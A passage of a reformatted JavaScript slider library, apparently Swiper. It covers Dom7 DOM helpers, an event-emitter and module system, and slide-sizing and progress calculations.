        for (var t = [], i = 0; i < e.length; i += 1)
            -1 === t.indexOf(e[i]) && t.push(e[i]);
        return t
    }
    s.fn = i.prototype,
    s.Class = i,
    s.Dom7 = i;
    var r = {
        addClass: function(e) {
            if (void 0 === e)
                return this;
            for (var t = e.split(" "), i = 0; i < t.length; i += 1)
                for (var s = 0; s < this.length; s += 1)
                    void 0 !== this[s] && void 0 !== this[s].classList && this[s].classList.add(t[i]);
            return this
        },
        removeClass: function(e) {
            for (var t = e.split(" "), i = 0; i < t.length; i += 1)
                for (var s = 0; s < this.length; s += 1)
                    void 0 !== this[s] && void 0 !== this[s].classList && this[s].classList.remove(t[i]);
            return this
        },
        hasClass: function(e) {
            return !!this[0] && this[0].classList.contains(e)
        },
        toggleClass: function(e) {
            for (var t = e.split(" "), i = 0; i < t.length; i += 1)
                for (var s = 0; s < this.length; s += 1)
                    void 0 !== this[s] && void 0 !== this[s].classList && this[s].classList.toggle(t[i]);
            return this
        },
        attr: function(e, t) {
            var i = arguments;
            if (1 === arguments.length && "string" == typeof e)
                return this[0] ? this[0].getAttribute(e) : void 0;
            for (var s = 0; s < this.length; s += 1)
                if (2 === i.length)
                    this[s].setAttribute(e, t);
                else
                    for (var a in e)
                        this[s][a] = e[a],
                        this[s].setAttribute(a, e[a]);
            return this
        },
        removeAttr: function(e) {
            for (var t = 0; t < this.length; t += 1)
                this[t].removeAttribute(e);
            return this
        },
        data: function(e, t) {
            var i;
            if (void 0 !== t) {
                for (var s = 0; s < this.length; s += 1)
                    (i = this[s]).dom7ElementDataStorage || (i.dom7ElementDataStorage = {}),
                    i.dom7ElementDataStorage[e] = t;
                return this
            }
            if (i = this[0]) {
                if (i.dom7ElementDataStorage && e in i.dom7ElementDataStorage)
                    return i.dom7ElementDataStorage[e];
                var a = i.getAttribute("data-" + e);
                return a || void 0
            }
        },
        transform: function(e) {
            for (var t = 0; t < this.length; t += 1) {
                var i = this[t].style;
                i.webkitTransform = e,
                i.transform = e
            }
            return this
        },
        transition: function(e) {
            "string" != typeof e && (e += "ms");
            for (var t = 0; t < this.length; t += 1) {
                var i = this[t].style;
                i.webkitTransitionDuration = e,
                i.transitionDuration = e
            }
            return this
        },
        on: function() {
            for (var e, t = [], i = arguments.length; i--; )
                t[i] = arguments[i];
            var a = t[0]
              , r = t[1]
              , n = t[2]
              , o = t[3];
            function l(e) {
                var t = e.target;
                if (t) {
                    var i = e.target.dom7EventData || [];
                    if (i.indexOf(e) < 0 && i.unshift(e),
                    s(t).is(r))
                        n.apply(t, i);
                    else
                        for (var a = s(t).parents(), o = 0; o < a.length; o += 1)
                            s(a[o]).is(r) && n.apply(a[o], i)
                }
            }
            function d(e) {
                var t = e && e.target && e.target.dom7EventData || [];
                t.indexOf(e) < 0 && t.unshift(e),
                n.apply(this, t)
            }
            "function" == typeof t[1] && (a = (e = t)[0],
            n = e[1],
            o = e[2],
            r = void 0),
            o || (o = !1);
            for (var h, p = a.split(" "), c = 0; c < this.length; c += 1) {
                var u = this[c];
                if (r)
                    for (h = 0; h < p.length; h += 1) {
                        var v = p[h];
                        u.dom7LiveListeners || (u.dom7LiveListeners = {}),
                        u.dom7LiveListeners[v] || (u.dom7LiveListeners[v] = []),
                        u.dom7LiveListeners[v].push({
                            listener: n,
                            proxyListener: l
                        }),
                        u.addEventListener(v, l, o)
                    }
                else
                    for (h = 0; h < p.length; h += 1) {
                        var f = p[h];
                        u.dom7Listeners || (u.dom7Listeners = {}),
                        u.dom7Listeners[f] || (u.dom7Listeners[f] = []),
                        u.dom7Listeners[f].push({
                            listener: n,
                            proxyListener: d
                        }),
                        u.addEventListener(f, d, o)
                    }
            }
            return this
        },
        off: function() {
            for (var e, t = [], i = arguments.length; i--; )
                t[i] = arguments[i];
            var s = t[0]
              , a = t[1]
              , r = t[2]
              , n = t[3];
            "function" == typeof t[1] && (s = (e = t)[0],
            r = e[1],
            n = e[2],
            a = void 0),
            n || (n = !1);
            for (var o = s.split(" "), l = 0; l < o.length; l += 1)
                for (var d = o[l], h = 0; h < this.length; h += 1) {
                    var p = this[h]
                      , c = void 0;
                    if (!a && p.dom7Listeners ? c = p.dom7Listeners[d] : a && p.dom7LiveListeners && (c = p.dom7LiveListeners[d]),
                    c && c.length)
                        for (var u = c.length - 1; u >= 0; u -= 1) {
                            var v = c[u];
                            r && v.listener === r ? (p.removeEventListener(d, v.proxyListener, n),
                            c.splice(u, 1)) : r && v.listener && v.listener.dom7proxy && v.listener.dom7proxy === r ? (p.removeEventListener(d, v.proxyListener, n),
                            c.splice(u, 1)) : r || (p.removeEventListener(d, v.proxyListener, n),
                            c.splice(u, 1))
                        }
                }
            return this
        },
        trigger: function() {
            for (var i = [], s = arguments.length; s--; )
                i[s] = arguments[s];
            for (var a = i[0].split(" "), r = i[1], n = 0; n < a.length; n += 1)
                for (var o = a[n], l = 0; l < this.length; l += 1) {
                    var d = this[l]
                      , h = void 0;
                    try {
                        h = new t.CustomEvent(o,{
                            detail: r,
                            bubbles: !0,
                            cancelable: !0
                        })
                    } catch (t) {
                        (h = e.createEvent("Event")).initEvent(o, !0, !0),
                        h.detail = r
                    }
                    d.dom7EventData = i.filter(function(e, t) {
                        return t > 0
                    }),
                    d.dispatchEvent(h),
                    d.dom7EventData = [],
                    delete d.dom7EventData
                }
            return this
        },
        transitionEnd: function(e) {
            var t, i = ["webkitTransitionEnd", "transitionend"], s = this;
            function a(r) {
                if (r.target === this)
                    for (e.call(this, r),
                    t = 0; t < i.length; t += 1)
                        s.off(i[t], a)
            }
            if (e)
                for (t = 0; t < i.length; t += 1)
                    s.on(i[t], a);
            return this
        },
        outerWidth: function(e) {
            if (this.length > 0) {
                if (e) {
                    var t = this.styles();
                    return this[0].offsetWidth + parseFloat(t.getPropertyValue("margin-right")) + parseFloat(t.getPropertyValue("margin-left"))
                }
                return this[0].offsetWidth
            }
            return null
        },
        outerHeight: function(e) {
            if (this.length > 0) {
                if (e) {
                    var t = this.styles();
                    return this[0].offsetHeight + parseFloat(t.getPropertyValue("margin-top")) + parseFloat(t.getPropertyValue("margin-bottom"))
                }
                return this[0].offsetHeight
            }
            return null
        },
        offset: function() {
            if (this.length > 0) {
                var i = this[0]
                  , s = i.getBoundingClientRect()
                  , a = e.body
                  , r = i.clientTop || a.clientTop || 0
                  , n = i.clientLeft || a.clientLeft || 0
                  , o = i === t ? t.scrollY : i.scrollTop
                  , l = i === t ? t.scrollX : i.scrollLeft;
                return {
                    top: s.top + o - r,
                    left: s.left + l - n
                }
            }
            return null
        },
        css: function(e, i) {
            var s;
            if (1 === arguments.length) {
                if ("string" != typeof e) {
                    for (s = 0; s < this.length; s += 1)
                        for (var a in e)
                            this[s].style[a] = e[a];
                    return this
                }
                if (this[0])
                    return t.getComputedStyle(this[0], null).getPropertyValue(e)
            }
            if (2 === arguments.length && "string" == typeof e) {
                for (s = 0; s < this.length; s += 1)
                    this[s].style[e] = i;
                return this
            }
            return this
        },
        each: function(e) {
            if (!e)
                return this;
            for (var t = 0; t < this.length; t += 1)
                if (!1 === e.call(this[t], t, this[t]))
                    return this;
            return this
        },
        html: function(e) {
            if (void 0 === e)
                return this[0] ? this[0].innerHTML : void 0;
            for (var t = 0; t < this.length; t += 1)
                this[t].innerHTML = e;
            return this
        },
        text: function(e) {
            if (void 0 === e)
                return this[0] ? this[0].textContent.trim() : null;
            for (var t = 0; t < this.length; t += 1)
                this[t].textContent = e;
            return this
        },
        is: function(a) {
            var r, n, o = this[0];
            if (!o || void 0 === a)
                return !1;
            if ("string" == typeof a) {
                if (o.matches)
                    return o.matches(a);
                if (o.webkitMatchesSelector)
                    return o.webkitMatchesSelector(a);
                if (o.msMatchesSelector)
                    return o.msMatchesSelector(a);
                for (r = s(a),
                n = 0; n < r.length; n += 1)
                    if (r[n] === o)
                        return !0;
                return !1
            }
            if (a === e)
                return o === e;
            if (a === t)
                return o === t;
            if (a.nodeType || a instanceof i) {
                for (r = a.nodeType ? [a] : a,
                n = 0; n < r.length; n += 1)
                    if (r[n] === o)
                        return !0;
                return !1
            }
            return !1
        },
        index: function() {
            var e, t = this[0];
            if (t) {
                for (e = 0; null !== (t = t.previousSibling); )
                    1 === t.nodeType && (e += 1);
                return e
            }
        },
        eq: function(e) {
            if (void 0 === e)
                return this;
            var t, s = this.length;
            return new i(e > s - 1 ? [] : e < 0 ? (t = s + e) < 0 ? [] : [this[t]] : [this[e]])
        },
        append: function() {
            for (var t, s = [], a = arguments.length; a--; )
                s[a] = arguments[a];
            for (var r = 0; r < s.length; r += 1) {
                t = s[r];
                for (var n = 0; n < this.length; n += 1)
                    if ("string" == typeof t) {
                        var o = e.createElement("div");
                        for (o.innerHTML = t; o.firstChild; )
                            this[n].appendChild(o.firstChild)
                    } else if (t instanceof i)
                        for (var l = 0; l < t.length; l += 1)
                            this[n].appendChild(t[l]);
                    else
                        this[n].appendChild(t)
            }
            return this
        },
        prepend: function(t) {
            var s, a;
            for (s = 0; s < this.length; s += 1)
                if ("string" == typeof t) {
                    var r = e.createElement("div");
                    for (r.innerHTML = t,
                    a = r.childNodes.length - 1; a >= 0; a -= 1)
                        this[s].insertBefore(r.childNodes[a], this[s].childNodes[0])
                } else if (t instanceof i)
                    for (a = 0; a < t.length; a += 1)
                        this[s].insertBefore(t[a], this[s].childNodes[0]);
                else
                    this[s].insertBefore(t, this[s].childNodes[0]);
            return this
        },
        next: function(e) {
            return this.length > 0 ? e ? this[0].nextElementSibling && s(this[0].nextElementSibling).is(e) ? new i([this[0].nextElementSibling]) : new i([]) : this[0].nextElementSibling ? new i([this[0].nextElementSibling]) : new i([]) : new i([])
        },
        nextAll: function(e) {
            var t = []
              , a = this[0];
            if (!a)
                return new i([]);
            for (; a.nextElementSibling; ) {
                var r = a.nextElementSibling;
                e ? s(r).is(e) && t.push(r) : t.push(r),
                a = r
            }
            return new i(t)
        },
        prev: function(e) {
            if (this.length > 0) {
                var t = this[0];
                return e ? t.previousElementSibling && s(t.previousElementSibling).is(e) ? new i([t.previousElementSibling]) : new i([]) : t.previousElementSibling ? new i([t.previousElementSibling]) : new i([])
            }
            return new i([])
        },
        prevAll: function(e) {
            var t = []
              , a = this[0];
            if (!a)
                return new i([]);
            for (; a.previousElementSibling; ) {
                var r = a.previousElementSibling;
                e ? s(r).is(e) && t.push(r) : t.push(r),
                a = r
            }
            return new i(t)
        },
        parent: function(e) {
            for (var t = [], i = 0; i < this.length; i += 1)
                null !== this[i].parentNode && (e ? s(this[i].parentNode).is(e) && t.push(this[i].parentNode) : t.push(this[i].parentNode));
            return s(a(t))
        },
        parents: function(e) {
            for (var t = [], i = 0; i < this.length; i += 1)
                for (var r = this[i].parentNode; r; )
                    e ? s(r).is(e) && t.push(r) : t.push(r),
                    r = r.parentNode;
            return s(a(t))
        },
        closest: function(e) {
            var t = this;
            return void 0 === e ? new i([]) : (t.is(e) || (t = t.parents(e).eq(0)),
            t)
        },
        find: function(e) {
            for (var t = [], s = 0; s < this.length; s += 1)
                for (var a = this[s].querySelectorAll(e), r = 0; r < a.length; r += 1)
                    t.push(a[r]);
            return new i(t)
        },
        children: function(e) {
            for (var t = [], r = 0; r < this.length; r += 1)
                for (var n = this[r].childNodes, o = 0; o < n.length; o += 1)
                    e ? 1 === n[o].nodeType && s(n[o]).is(e) && t.push(n[o]) : 1 === n[o].nodeType && t.push(n[o]);
            return new i(a(t))
        },
        remove: function() {
            for (var e = 0; e < this.length; e += 1)
                this[e].parentNode && this[e].parentNode.removeChild(this[e]);
            return this
        },
        add: function() {
            for (var e = [], t = arguments.length; t--; )
                e[t] = arguments[t];
            var i, a;
            for (i = 0; i < e.length; i += 1) {
                var r = s(e[i]);
                for (a = 0; a < r.length; a += 1)
                    this[this.length] = r[a],
                    this.length += 1
            }
            return this
        },
        styles: function() {
            return this[0] ? t.getComputedStyle(this[0], null) : {}
        }
    };
    Object.keys(r).forEach(function(e) {
        s.fn[e] = s.fn[e] || r[e]
    });
    var n, o, l = {
        deleteProps: function(e) {
            var t = e;
            Object.keys(t).forEach(function(e) {
                try {
                    t[e] = null
                } catch (e) {}
                try {
                    delete t[e]
                } catch (e) {}
            })
        },
        nextTick: function(e, t) {
            return void 0 === t && (t = 0),
            setTimeout(e, t)
        },
        now: function() {
            return Date.now()
        },
        getTranslate: function(e, i) {
            var s, a, r;
            void 0 === i && (i = "x");
            var n = t.getComputedStyle(e, null);
            return t.WebKitCSSMatrix ? ((a = n.transform || n.webkitTransform).split(",").length > 6 && (a = a.split(", ").map(function(e) {
                return e.replace(",", ".")
            }).join(", ")),
            r = new t.WebKitCSSMatrix("none" === a ? "" : a)) : s = (r = n.MozTransform || n.OTransform || n.MsTransform || n.msTransform || n.transform || n.getPropertyValue("transform").replace("translate(", "matrix(1, 0, 0, 1,")).toString().split(","),
            "x" === i && (a = t.WebKitCSSMatrix ? r.m41 : 16 === s.length ? parseFloat(s[12]) : parseFloat(s[4])),
            "y" === i && (a = t.WebKitCSSMatrix ? r.m42 : 16 === s.length ? parseFloat(s[13]) : parseFloat(s[5])),
            a || 0
        },
        parseUrlQuery: function(e) {
            var i, s, a, r, n = {}, o = e || t.location.href;
            if ("string" == typeof o && o.length)
                for (r = (s = (o = o.indexOf("?") > -1 ? o.replace(/\S*\?/, "") : "").split("&").filter(function(e) {
                    return "" !== e
                })).length,
                i = 0; i < r; i += 1)
                    a = s[i].replace(/#\S+/g, "").split("="),
                    n[decodeURIComponent(a[0])] = void 0 === a[1] ? void 0 : decodeURIComponent(a[1]) || "";
            return n
        },
        isObject: function(e) {
            return "object" == typeof e && null !== e && e.constructor && e.constructor === Object
        },
        extend: function() {
            for (var e = [], t = arguments.length; t--; )
                e[t] = arguments[t];
            for (var i = Object(e[0]), s = 1; s < e.length; s += 1) {
                var a = e[s];
                if (null != a)
                    for (var r = Object.keys(Object(a)), n = 0, o = r.length; n < o; n += 1) {
                        var d = r[n]
                          , h = Object.getOwnPropertyDescriptor(a, d);
                        void 0 !== h && h.enumerable && (l.isObject(i[d]) && l.isObject(a[d]) ? l.extend(i[d], a[d]) : !l.isObject(i[d]) && l.isObject(a[d]) ? (i[d] = {},
                        l.extend(i[d], a[d])) : i[d] = a[d])
                    }
            }
            return i
        }
    }, d = (o = e.createElement("div"),
    {
        touch: t.Modernizr && !0 === t.Modernizr.touch || !!(t.navigator.maxTouchPoints > 0 || "ontouchstart"in t || t.DocumentTouch && e instanceof t.DocumentTouch),
        pointerEvents: !!(t.navigator.pointerEnabled || t.PointerEvent || "maxTouchPoints"in t.navigator && t.navigator.maxTouchPoints > 0),
        prefixedPointerEvents: !!t.navigator.msPointerEnabled,
        transition: (n = o.style,
        "transition"in n || "webkitTransition"in n || "MozTransition"in n),
        transforms3d: t.Modernizr && !0 === t.Modernizr.csstransforms3d || function() {
            var e = o.style;
            return "webkitPerspective"in e || "MozPerspective"in e || "OPerspective"in e || "MsPerspective"in e || "perspective"in e
        }(),
        flexbox: function() {
            for (var e = o.style, t = "alignItems webkitAlignItems webkitBoxAlign msFlexAlign mozBoxAlign webkitFlexDirection msFlexDirection mozBoxDirection mozBoxOrient webkitBoxDirection webkitBoxOrient".split(" "), i = 0; i < t.length; i += 1)
                if (t[i]in e)
                    return !0;
            return !1
        }(),
        observer: "MutationObserver"in t || "WebkitMutationObserver"in t,
        passiveListener: function() {
            var e = !1;
            try {
                var i = Object.defineProperty({}, "passive", {
                    get: function() {
                        e = !0
                    }
                });
                t.addEventListener("testPassiveListener", null, i)
            } catch (e) {}
            return e
        }(),
        gestures: "ongesturestart"in t
    }), h = function() {
        return {
            isIE: !!t.navigator.userAgent.match(/Trident/g) || !!t.navigator.userAgent.match(/MSIE/g),
            isEdge: !!t.navigator.userAgent.match(/Edge/g),
            isSafari: (e = t.navigator.userAgent.toLowerCase(),
            e.indexOf("safari") >= 0 && e.indexOf("chrome") < 0 && e.indexOf("android") < 0),
            isUiWebView: /(iPhone|iPod|iPad).*AppleWebKit(?!.*Safari)/i.test(t.navigator.userAgent)
        };
        var e
    }(), p = function(e) {
        void 0 === e && (e = {});
        var t = this;
        t.params = e,
        t.eventsListeners = {},
        t.params && t.params.on && Object.keys(t.params.on).forEach(function(e) {
            t.on(e, t.params.on[e])
        })
    }, c = {
        components: {
            configurable: !0
        }
    };
    p.prototype.on = function(e, t, i) {
        var s = this;
        if ("function" != typeof t)
            return s;
        var a = i ? "unshift" : "push";
        return e.split(" ").forEach(function(e) {
            s.eventsListeners[e] || (s.eventsListeners[e] = []),
            s.eventsListeners[e][a](t)
        }),
        s
    }
    ,
    p.prototype.once = function(e, t, i) {
        var s = this;
        if ("function" != typeof t)
            return s;
        function a() {
            for (var i = [], r = arguments.length; r--; )
                i[r] = arguments[r];
            t.apply(s, i),
            s.off(e, a),
            a.f7proxy && delete a.f7proxy
        }
        return a.f7proxy = t,
        s.on(e, a, i)
    }
    ,
    p.prototype.off = function(e, t) {
        var i = this;
        return i.eventsListeners ? (e.split(" ").forEach(function(e) {
            void 0 === t ? i.eventsListeners[e] = [] : i.eventsListeners[e] && i.eventsListeners[e].length && i.eventsListeners[e].forEach(function(s, a) {
                (s === t || s.f7proxy && s.f7proxy === t) && i.eventsListeners[e].splice(a, 1)
            })
        }),
        i) : i
    }
    ,
    p.prototype.emit = function() {
        for (var e = [], t = arguments.length; t--; )
            e[t] = arguments[t];
        var i, s, a, r = this;
        return r.eventsListeners ? ("string" == typeof e[0] || Array.isArray(e[0]) ? (i = e[0],
        s = e.slice(1, e.length),
        a = r) : (i = e[0].events,
        s = e[0].data,
        a = e[0].context || r),
        (Array.isArray(i) ? i : i.split(" ")).forEach(function(e) {
            if (r.eventsListeners && r.eventsListeners[e]) {
                var t = [];
                r.eventsListeners[e].forEach(function(e) {
                    t.push(e)
                }),
                t.forEach(function(e) {
                    e.apply(a, s)
                })
            }
        }),
        r) : r
    }
    ,
    p.prototype.useModulesParams = function(e) {
        var t = this;
        t.modules && Object.keys(t.modules).forEach(function(i) {
            var s = t.modules[i];
            s.params && l.extend(e, s.params)
        })
    }
    ,
    p.prototype.useModules = function(e) {
        void 0 === e && (e = {});
        var t = this;
        t.modules && Object.keys(t.modules).forEach(function(i) {
            var s = t.modules[i]
              , a = e[i] || {};
            s.instance && Object.keys(s.instance).forEach(function(e) {
                var i = s.instance[e];
                t[e] = "function" == typeof i ? i.bind(t) : i
            }),
            s.on && t.on && Object.keys(s.on).forEach(function(e) {
                t.on(e, s.on[e])
            }),
            s.create && s.create.bind(t)(a)
        })
    }
    ,
    c.components.set = function(e) {
        this.use && this.use(e)
    }
    ,
    p.installModule = function(e) {
        for (var t = [], i = arguments.length - 1; i-- > 0; )
            t[i] = arguments[i + 1];
        var s = this;
        s.prototype.modules || (s.prototype.modules = {});
        var a = e.name || Object.keys(s.prototype.modules).length + "_" + l.now();
        return s.prototype.modules[a] = e,
        e.proto && Object.keys(e.proto).forEach(function(t) {
            s.prototype[t] = e.proto[t]
        }),
        e.static && Object.keys(e.static).forEach(function(t) {
            s[t] = e.static[t]
        }),
        e.install && e.install.apply(s, t),
        s
    }
    ,
    p.use = function(e) {
        for (var t = [], i = arguments.length - 1; i-- > 0; )
            t[i] = arguments[i + 1];
        var s = this;
        return Array.isArray(e) ? (e.forEach(function(e) {
            return s.installModule(e)
        }),
        s) : s.installModule.apply(s, [e].concat(t))
    }
    ,
    Object.defineProperties(p, c);
    var u = {
        updateSize: function() {
            var e, t, i = this.$el;
            e = void 0 !== this.params.width ? this.params.width : i[0].clientWidth,
            t = void 0 !== this.params.height ? this.params.height : i[0].clientHeight,
            0 === e && this.isHorizontal() || 0 === t && this.isVertical() || (e = e - parseInt(i.css("padding-left"), 10) - parseInt(i.css("padding-right"), 10),
            t = t - parseInt(i.css("padding-top"), 10) - parseInt(i.css("padding-bottom"), 10),
            l.extend(this, {
                width: e,
                height: t,
                size: this.isHorizontal() ? e : t
            }))
        },
        updateSlides: function() {
            var e = this.params
              , i = this.$wrapperEl
              , s = this.size
              , a = this.rtlTranslate
              , r = this.wrongRTL
              , n = this.virtual && e.virtual.enabled
              , o = n ? this.virtual.slides.length : this.slides.length
              , p = i.children("." + this.params.slideClass)
              , c = n ? this.virtual.slides.length : p.length
              , u = []
              , v = []
              , f = []
              , m = e.slidesOffsetBefore;
            "function" == typeof m && (m = e.slidesOffsetBefore.call(this));
            var g = e.slidesOffsetAfter;
            "function" == typeof g && (g = e.slidesOffsetAfter.call(this));
            var b = this.snapGrid.length
              , w = this.snapGrid.length
              , y = e.spaceBetween
              , x = -m
              , T = 0
              , E = 0;
            if (void 0 !== s) {
                var S, C;
                "string" == typeof y && y.indexOf("%") >= 0 && (y = parseFloat(y.replace("%", "")) / 100 * s),
                this.virtualSize = -y,
                a ? p.css({
                    marginLeft: "",
                    marginTop: ""
                }) : p.css({
                    marginRight: "",
                    marginBottom: ""
                }),
                e.slidesPerColumn > 1 && (S = Math.floor(c / e.slidesPerColumn) === c / this.params.slidesPerColumn ? c : Math.ceil(c / e.slidesPerColumn) * e.slidesPerColumn,
                "auto" !== e.slidesPerView && "row" === e.slidesPerColumnFill && (S = Math.max(S, e.slidesPerView * e.slidesPerColumn)));
                for (var M, P = e.slidesPerColumn, k = S / P, z = Math.floor(c / e.slidesPerColumn), $ = 0; $ < c; $ += 1) {
                    C = 0;
                    var I = p.eq($);
                    if (e.slidesPerColumn > 1) {
                        var L = void 0
                          , D = void 0
                          , O = void 0;
                        if ("column" === e.slidesPerColumnFill || "row" === e.slidesPerColumnFill && e.slidesPerGroup > 1) {
                            if ("column" === e.slidesPerColumnFill)
                                O = $ - (D = Math.floor($ / P)) * P,
                                (D > z || D === z && O === P - 1) && (O += 1) >= P && (O = 0,
                                D += 1);
                            else {
                                var A = Math.floor($ / e.slidesPerGroup);
                                D = $ - (O = Math.floor($ / e.slidesPerView) - A * e.slidesPerColumn) * e.slidesPerView - A * e.slidesPerView
                            }
                            L = D + O * S / P,
                            I.css({
                                "-webkit-box-ordinal-group": L,
                                "-moz-box-ordinal-group": L,
                                "-ms-flex-order": L,
                                "-webkit-order": L,
                                order: L
                            })
                        } else
                            D = $ - (O = Math.floor($ / k)) * k;
                        I.css("margin-" + (this.isHorizontal() ? "top" : "left"), 0 !== O && e.spaceBetween && e.spaceBetween + "px").attr("data-swiper-column", D).attr("data-swiper-row", O)
                    }
                    if ("none" !== I.css("display")) {
                        if ("auto" === e.slidesPerView) {
                            var H = t.getComputedStyle(I[0], null)
                              , G = I[0].style.transform
                              , N = I[0].style.webkitTransform;
                            if (G && (I[0].style.transform = "none"),
                            N && (I[0].style.webkitTransform = "none"),
                            e.roundLengths)
                                C = this.isHorizontal() ? I.outerWidth(!0) : I.outerHeight(!0);
                            else if (this.isHorizontal()) {
                                var B = parseFloat(H.getPropertyValue("width"))
                                  , X = parseFloat(H.getPropertyValue("padding-left"))
                                  , V = parseFloat(H.getPropertyValue("padding-right"))
                                  , Y = parseFloat(H.getPropertyValue("margin-left"))
                                  , F = parseFloat(H.getPropertyValue("margin-right"))
                                  , R = H.getPropertyValue("box-sizing");
                                C = R && "border-box" === R && !h.isIE ? B + Y + F : B + X + V + Y + F
                            } else {
                                var q = parseFloat(H.getPropertyValue("height"))
                                  , W = parseFloat(H.getPropertyValue("padding-top"))
                                  , j = parseFloat(H.getPropertyValue("padding-bottom"))
                                  , U = parseFloat(H.getPropertyValue("margin-top"))
                                  , K = parseFloat(H.getPropertyValue("margin-bottom"))
                                  , _ = H.getPropertyValue("box-sizing");
                                C = _ && "border-box" === _ && !h.isIE ? q + U + K : q + W + j + U + K
                            }
                            G && (I[0].style.transform = G),
                            N && (I[0].style.webkitTransform = N),
                            e.roundLengths && (C = Math.floor(C))
                        } else
                            C = (s - (e.slidesPerView - 1) * y) / e.slidesPerView,
                            e.roundLengths && (C = Math.floor(C)),
                            p[$] && (this.isHorizontal() ? p[$].style.width = C + "px" : p[$].style.height = C + "px");
                        p[$] && (p[$].swiperSlideSize = C),
                        f.push(C),
                        e.centeredSlides ? (x = x + C / 2 + T / 2 + y,
                        0 === T && 0 !== $ && (x = x - s / 2 - y),
                        0 === $ && (x = x - s / 2 - y),
                        Math.abs(x) < .001 && (x = 0),
                        e.roundLengths && (x = Math.floor(x)),
                        E % e.slidesPerGroup == 0 && u.push(x),
                        v.push(x)) : (e.roundLengths && (x = Math.floor(x)),
                        E % e.slidesPerGroup == 0 && u.push(x),
                        v.push(x),
                        x = x + C + y),
                        this.virtualSize += C + y,
                        T = C,
                        E += 1
                    }
                }
                if (this.virtualSize = Math.max(this.virtualSize, s) + g,
                a && r && ("slide" === e.effect || "coverflow" === e.effect) && i.css({
                    width: this.virtualSize + e.spaceBetween + "px"
                }),
                d.flexbox && !e.setWrapperSize || (this.isHorizontal() ? i.css({
                    width: this.virtualSize + e.spaceBetween + "px"
                }) : i.css({
                    height: this.virtualSize + e.spaceBetween + "px"
                })),
                e.slidesPerColumn > 1 && (this.virtualSize = (C + e.spaceBetween) * S,
                this.virtualSize = Math.ceil(this.virtualSize / e.slidesPerColumn) - e.spaceBetween,
                this.isHorizontal() ? i.css({
                    width: this.virtualSize + e.spaceBetween + "px"
                }) : i.css({
                    height: this.virtualSize + e.spaceBetween + "px"
                }),
                e.centeredSlides)) {
                    M = [];
                    for (var Z = 0; Z < u.length; Z += 1) {
                        var Q = u[Z];
                        e.roundLengths && (Q = Math.floor(Q)),
                        u[Z] < this.virtualSize + u[0] && M.push(Q)
                    }
                    u = M
                }
                if (!e.centeredSlides) {
                    M = [];
                    for (var J = 0; J < u.length; J += 1) {
                        var ee = u[J];
                        e.roundLengths && (ee = Math.floor(ee)),
                        u[J] <= this.virtualSize - s && M.push(ee)
                    }
                    u = M,
                    Math.floor(this.virtualSize - s) - Math.floor(u[u.length - 1]) > 1 && u.push(this.virtualSize - s)
                }
                if (0 === u.length && (u = [0]),
                0 !== e.spaceBetween && (this.isHorizontal() ? a ? p.css({
                    marginLeft: y + "px"
                }) : p.css({
                    marginRight: y + "px"
                }) : p.css({
                    marginBottom: y + "px"
                })),
                e.centerInsufficientSlides) {
                    var te = 0;
                    if (f.forEach(function(t) {
                        te += t + (e.spaceBetween ? e.spaceBetween : 0)
                    }),
                    (te -= e.spaceBetween) < s) {
                        var ie = (s - te) / 2;
                        u.forEach(function(e, t) {
                            u[t] = e - ie
                        }),
                        v.forEach(function(e, t) {
                            v[t] = e + ie
                        })
                    }
                }
                l.extend(this, {
                    slides: p,
                    snapGrid: u,
                    slidesGrid: v,
                    slidesSizesGrid: f
                }),
                c !== o && this.emit("slidesLengthChange"),
                u.length !== b && (this.params.watchOverflow && this.checkOverflow(),
                this.emit("snapGridLengthChange")),
                v.length !== w && this.emit("slidesGridLengthChange"),
                (e.watchSlidesProgress || e.watchSlidesVisibility) && this.updateSlidesOffset()
            }
        },
        updateAutoHeight: function(e) {
            var t, i = [], s = 0;
            if ("number" == typeof e ? this.setTransition(e) : !0 === e && this.setTransition(this.params.speed),
            "auto" !== this.params.slidesPerView && this.params.slidesPerView > 1)
                for (t = 0; t < Math.ceil(this.params.slidesPerView); t += 1) {
                    var a = this.activeIndex + t;
                    if (a > this.slides.length)
                        break;
                    i.push(this.slides.eq(a)[0])
                }
            else
                i.push(this.slides.eq(this.activeIndex)[0]);
            for (t = 0; t < i.length; t += 1)
                if (void 0 !== i[t]) {
                    var r = i[t].offsetHeight;
                    s = r > s ? r : s
                }
            s && this.$wrapperEl.css("height", s + "px")
        },
        updateSlidesOffset: function() {
            for (var e = this.slides, t = 0; t < e.length; t += 1)
                e[t].swiperSlideOffset = this.isHorizontal() ? e[t].offsetLeft : e[t].offsetTop
        },
        updateSlidesProgress: function(e) {
            void 0 === e && (e = this && this.translate || 0);
            var t = this.params
              , i = this.slides
              , a = this.rtlTranslate;
            if (0 !== i.length) {
                void 0 === i[0].swiperSlideOffset && this.updateSlidesOffset();
                var r = -e;
                a && (r = e),
                i.removeClass(t.slideVisibleClass),
                this.visibleSlidesIndexes = [],
                this.visibleSlides = [];
                for (var n = 0; n < i.length; n += 1) {
                    var o = i[n]
                      , l = (r + (t.centeredSlides ? this.minTranslate() : 0) - o.swiperSlideOffset) / (o.swiperSlideSize + t.spaceBetween);
                    if (t.watchSlidesVisibility) {
                        var d = -(r - o.swiperSlideOffset)
                          , h = d + this.slidesSizesGrid[n];
                        (d >= 0 && d < this.size - 1 || h > 1 && h <= this.size || d <= 0 && h >= this.size) && (this.visibleSlides.push(o),
                        this.visibleSlidesIndexes.push(n),
                        i.eq(n).addClass(t.slideVisibleClass))
                    }
                    o.progress = a ? -l : l
                }
                this.visibleSlides = s(this.visibleSlides)
            }
        },
        updateProgress: function(e) {
            void 0 === e && (e = this && this.translate || 0);
            var t = this.params
              , i = this.maxTranslate() - this.minTranslate()
              , s = this.progress
              , a = this.isBeginning
              , r = this.isEnd
              , n = a
              , o = r;
            0 === i ? (s = 0,
            a = !0,
            r = !0) : (a = (s = (e - this.minTranslate()) / i) <= 0,
            r = s >= 1),
            l.extend(this, {
                progress: s,
                isBeginning: a,
                isEnd: r
            }),
            (t.watchSlidesProgress || t.watchSlidesVisibility) && this.updateSlidesProgress(e),
            a && !n && this.emit("reachBeginning toEdge"),
            r && !o && this.emit("reachEnd toEdge"),
            (n && !a || o && !r) && this.emit("fromEdge"),
            this.emit("progress", s)
        },
        updateSlidesClasses: function() {
            var e, t = this.slides, i = this.params, s = this.$wrapperEl, a = this.activeIndex, r = this.realIndex, n = this.virtual && i.virtual.enabled;
            t.removeClass(i.slideActiveClass + " " + i.slideNextClass + " " + i.slidePrevClass + " " + i.slideDuplicateActiveClass + " " + i.slideDuplicateNextClass + " " + i.slideDuplicatePrevClass),
